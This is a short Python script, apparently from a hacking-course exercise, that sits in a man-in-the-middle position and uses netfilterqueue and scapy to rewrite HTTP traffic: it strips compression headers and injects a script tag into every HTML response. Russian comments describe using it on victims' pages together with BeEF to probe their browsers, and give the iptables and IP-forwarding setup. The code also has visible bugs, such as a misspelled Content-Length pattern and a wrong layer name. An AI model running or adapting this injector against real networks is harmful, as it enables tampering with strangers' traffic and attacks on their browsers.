#!/usr/bin/env python
# work at >= 3.6 (netfilterqeueue dont work at highers version)
# https://stackoverflow.com/questions/61301351/how-do-i-install-netfilterqueue-for-python3

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            # print(scapy_packet.show())
            injection_code = "<script>alert('test');</script>"
            load = load.replace("</body>", injection_code + "</body>")  #метод можно использовать в любой строке в любой ситуации
            content_length_search = re.search("(?:Content-Lenght:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_lenght = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_lenght))

        if load != scapy_packet[scapy.RAW].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

        packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

#код яву или html внедряет в страницу. можно использовать вместе с бифером и искать уязвимости в браузерах жертвы. работает на хттп!!!.
#iptables --flush
#iptables -I FORWARD -j NFQUEUE -- queue-num 0
#не забыть включить маршрутизацию: echo 1 > /proc/sys/net/ipv4/ip_forward
#python code_injector.py
